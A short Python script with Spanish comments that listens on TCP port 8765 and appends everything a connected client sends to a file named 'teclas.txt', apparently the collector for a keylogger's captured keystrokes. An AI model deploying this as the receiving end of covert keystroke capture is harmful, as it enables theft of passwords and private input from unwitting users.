import socket
import subprocess
import sys
import time
import os

ruta = os.path.join(os.getcwd(), "teclas.txt")
host = "0.0.0.0"
puerto = 8765

#Inicio un socket IPv4 (AF_INET) y de flujo (SOCK_STREAM)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    #Asocio el socket a la ip y puerto que deseo
    server.bind((host, puerto))
    #Lo pongo a escuchar
    server.listen()

    print(f"Servidor esperando conexiones en {host}:{puerto}")

    conexion, ip = server.accept()

    with conexion:
        print(f"Cliente conectado -> {ip}")

        while True:
            data = conexion.recv(1024)
            #Añado lo que ha escrito el cliente a mi archivo
            if data:
                with open(ruta, "ab") as file:
                    file.write(data)
                print("Datos recibidos correctamente.")

